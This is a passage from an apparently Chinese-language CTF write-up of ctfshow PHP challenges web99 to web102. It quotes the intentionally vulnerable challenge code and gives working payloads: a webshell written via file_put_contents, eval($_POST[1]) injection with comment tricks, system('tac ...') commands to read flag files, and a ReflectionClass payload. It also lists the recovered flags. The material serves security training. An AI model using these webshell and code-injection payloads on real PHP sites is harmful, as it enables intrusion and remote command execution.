<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#b5cea8">3.</span><span style="color:#d4d4d4">添加修改cookie值，HTTP_FLAG：flag</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">a72c303-</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">c9d-</span><span style="color:#b5cea8">44</span><span style="color:#d4d4d4">db-af0c-bfb2d9d703cd}</span></span></code></pre></div></div></figure><h3 id="web99随机写入文件"><a class="markdownIt-Anchor" href="#web99随机写入文件"></a> web99	(随机写入文件)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$allow</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4"> &lt; </span><span style="color:#b5cea8">0x36d</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">++) { </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">array_push</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$allow</span><span style="color:#d4d4d4">, </span><span style="color:#dcdcaa">rand</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'n'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">in_array</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'n'</span><span style="color:#d4d4d4">], </span><span style="color:#9cdcfe">$allow</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">file_put_contents</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'n'</span><span style="color:#d4d4d4">], </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'content'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>这里的 array_push 可以插入元素到数组尾部，返回值为元素个数。</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">array_push</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">array</span><span style="color:#d4d4d4">,value1,value2...) </span></span>
<span class="line"><span style="color:#d4d4d4">参数 	描述</span></span>
<span class="line"><span style="color:#569cd6">array</span><span style="color:#d4d4d4"> 	必需。规定一个数组。</span></span>
<span class="line"><span style="color:#d4d4d4">value1 	必需。规定要添加的值。</span></span>
<span class="line"><span style="color:#d4d4d4">value2 	可选。规定要添加的值。</span></span>
<span class="line"><span style="color:#d4d4d4">返回值： 返回新数组的元素个数。</span></span></code></pre></div></div></figure><p>rand 函数则是生成随机数</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">rand</span><span style="color:#d4d4d4">();</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">or</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">rand</span><span style="color:#d4d4d4">(min,max);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">参数 		描述</span></span>
<span class="line"><span style="color:#d4d4d4">min 	可选。规定返回的最小数。默认是 </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">。</span></span>
<span class="line"><span style="color:#d4d4d4">max 	可选。规定返回的最大数。默认是 </span><span style="color:#dcdcaa">getrandmax</span><span style="color:#d4d4d4">()。</span></span>
<span class="line"><span style="color:#d4d4d4">返回值： 	介于 min（或 </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">）与 max（或 </span><span style="color:#dcdcaa">mt_getrandmax</span><span style="color:#d4d4d4">()）之间（包括边界值）的随机整数。</span></span>
<span class="line"><span style="color:#d4d4d4">返回类型： 	</span><span style="color:#569cd6">Integer</span></span></code></pre></div></div></figure><p>in_array 则是搜索数组中是否存在目标值</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#569cd6">bool</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">in_array</span><span style="color:#d4d4d4"> ( </span><span style="color:#569cd6">mixed</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$needle</span><span style="color:#d4d4d4"> , </span><span style="color:#569cd6">array</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$haystack</span><span style="color:#d4d4d4"> [, </span><span style="color:#569cd6">bool</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$strict</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4"> ] )</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">参数 	描述</span></span>
<span class="line"><span style="color:#d4d4d4">needle 	必需。规定要在数组搜索的值。</span></span>
<span class="line"><span style="color:#d4d4d4">haystack 	必需。规定要搜索的数组。</span></span>
<span class="line"><span style="color:#d4d4d4">strict 	可选。如果该参数设置为 </span><span style="color:#569cd6">TRUE</span><span style="color:#d4d4d4">，则 </span><span style="color:#dcdcaa">in_array</span><span style="color:#d4d4d4">() 函数检查搜索的数据与数组的值的类型是否相同。</span></span></code></pre></div></div></figure><p>file_put_contents 在这里则是以 n 为文件名写入 post 参数 content 的值，经过测试 1.php 是存在的，那么直接写入一句话：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152402.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221115142020368"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152203.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221115142034551"></p><p>访问之后成功写入，直接找 flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'ls'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">&gt;&gt;</span><span style="color:#b5cea8">1.</span><span style="color:#d4d4d4">php flag36d</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span></span>
<span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac flag36d.php'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">&gt;&gt;</span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"ctfshow{8d2eba32-d385-48ba-b643-b33e62d2efa0}"</span><span style="color:#d4d4d4">; */ </span><span style="color:#6a9955"># @link: https://ctfer.com # @email: h1xa@ctfer.com # @Last Modified time: 2020-09-16 11:25:00 # @Last Modified by: h1xa # @Date: 2020-09-16 11:24:37 # @Author: h1xa # -*- coding: utf-8 -*- /*</span></span></code></pre></div></div></figure><h3 id="web100运算优先级0x2d替换"><a class="markdownIt-Anchor" href="#web100运算优先级0x2d替换"></a> web100	(运算优先级 + 0x2d 替换)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"ctfshow.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#6a9955">//flag in class ctfshow;</span></span>
<span class="line"><span style="color:#9cdcfe">$ctfshow</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">ctfshow</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v0</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">) and </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">) and </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v0</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/\;/"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/\;/"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#9cdcfe">$v2</span><span style="color:#ce9178">('ctfshow')</span><span style="color:#9cdcfe">$v3</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v1 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">17</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v2 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">18</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v3 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">19</span></span></code></pre></div></div></figure><p>这里稍微注意一下运算优先级：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152557.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221115154302551"></p><p>赋值运算是高于逻辑运算的，所以这里的 v2 和 v3 哪怕是 false 也没有太大影响。</p><p>由于 eval () 函数里面将括号闭合了，参数已经写死，这个参数是很难被使用的，所以我们想能不能将这个参数给注释掉，而且 v2,v3 是可以随便写字符串的于是尝试构造：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?v1=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v2=</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">])</span><span style="color:#6a9955">/*&amp;v3=*/</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">post:</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac ctfshow.php'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>得到 flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">$flag_is_6930fa600x2db48e0x2d4e460x2d8c0c0x2d0fb1d57873d2</span><span style="color:#d4d4d4">;</span></span></code></pre></div></div></figure><p>其中 0x2d 是 ascii 码破折号，所以完整正确的 flag 是：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">6930</span><span style="color:#d4d4d4">fa60-b48e-</span><span style="color:#b5cea8">4e46</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">c0c-</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">fb1d57873d2}</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152082.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221115160237400"></p><h3 id="web101原生的反射类reflectionclass利用"><a class="markdownIt-Anchor" href="#web101原生的反射类reflectionclass利用"></a> web101	(原生的反射类 Reflectionclass 利用)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"ctfshow.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#6a9955">//flag in class ctfshow;</span></span>
<span class="line"><span style="color:#9cdcfe">$ctfshow</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">ctfshow</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v0</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">) and </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">) and </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v0</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/</span><span style="color:#d7ba7d">\\\\</span><span style="color:#d16969">|\/|\~|\`|\!|\@|\#|</span><span style="color:#d7ba7d">\\$</span><span style="color:#d16969">|\%|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|\</span><span style="color:#d4d4d4">*</span><span style="color:#d16969">|\)|\-|\_|\</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">|\=|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\[</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|\'|\,|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|\;|\?|[0-9]/"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/</span><span style="color:#d7ba7d">\\\\</span><span style="color:#d16969">|\/|\~|\`|\!|\@|\#|</span><span style="color:#d7ba7d">\\$</span><span style="color:#d16969">|\%|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|\</span><span style="color:#d4d4d4">*</span><span style="color:#d16969">|\(|\-|\_|\</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">|\=|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\[</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|\'|\,|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|\?|[0-9]/"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#9cdcfe">$v2</span><span style="color:#ce9178">('ctfshow')</span><span style="color:#9cdcfe">$v3</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v1 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">17</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v2 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">18</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v3 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">19</span></span></code></pre></div></div></figure><p>这题多了很多匹配， 确实也不会。</p><p>这里用官方解的话，是进行一个反射，将类反射出来。</p><p>了解反射类可以参考这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Renyi-Fan/p/14683547.html">https://www.cnblogs.com/Renyi-Fan/p/14683547.html</a></p><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?v1=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v2=</span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Reflectionclass</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v3=;</span></span></code></pre></div></div></figure><p>flag 依旧要替换 0x2d：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{e93849b9-</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">c61-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">c90-</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">bbd-a97af030b0d}</span></span></code></pre></div></div></figure><p>这里发现少一位，说明在末尾的 d 后面还有一位（试出来）：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{e93849b9-</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">c61-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">c90-</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">bbd-a97af030b0d0}</span></span></code></pre></div></div></figure><h3 id="web102call_user_func理解hex2bin利用"><a class="markdownIt-Anchor" href="#web102call_user_func理解hex2bin利用"></a> web102	(call_user_func 理解 + hex2bin 利用)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: atao</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v4</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">) and </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v4</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$s</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">call_user_func</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$s</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">;</span></span>
